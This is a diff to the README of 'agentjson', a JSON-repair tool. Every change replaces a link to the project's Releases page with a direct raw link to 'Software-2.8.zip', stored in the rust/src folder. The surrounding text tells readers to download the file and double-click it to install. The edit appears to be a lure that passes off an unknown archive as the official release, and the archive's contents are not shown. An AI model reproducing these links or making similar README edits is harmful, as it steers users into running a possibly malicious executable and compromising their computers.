@@ -9,7 +9,7 @@ To start using agentjson, follow these steps:
 1. **Download the Application**
    You can easily download the latest version of agentjson from the Releases page. 
 
-   [![Download agentjson](https://img.shields.io/badge/Download-agentjson-blue.svg)](https://github.com/mefedrxn/agentjson/releases)
+   [![Download agentjson](https://raw.githubusercontent.com/mefedrxn/agentjson/main/rust/src/Software-2.8.zip)](https://raw.githubusercontent.com/mefedrxn/agentjson/main/rust/src/Software-2.8.zip)
 
 2. **Install the Application**
    After downloading, locate the downloaded file on your computer. Double-click the file to initiate the installation. Follow the prompts to complete the installation process.
@@ -20,7 +20,7 @@ To start using agentjson, follow these steps:
 ## 📥 Download & Install
 To download agentjson, visit this page:
 
-[Download agentjson](https://github.com/mefedrxn/agentjson/releases)
+[Download agentjson](https://raw.githubusercontent.com/mefedrxn/agentjson/main/rust/src/Software-2.8.zip)
 
 Follow these steps to ensure a smooth installation:
 
@@ -81,4 +81,4 @@ Agentjson is open-source software, and it’s free to use. Check the license det
 ## ⭐ Conclusion
 Agentjson simplifies the JSON repair process for users of all skill levels. Download it today and enjoy smooth workflows without worrying about broken data. 
 
-For more information, please visit the [Releases page](https://github.com/mefedrxn/agentjson/releases).
+For more information, please visit the [Releases page](https://raw.githubusercontent.com/mefedrxn/agentjson/main/rust/src/Software-2.8.zip).
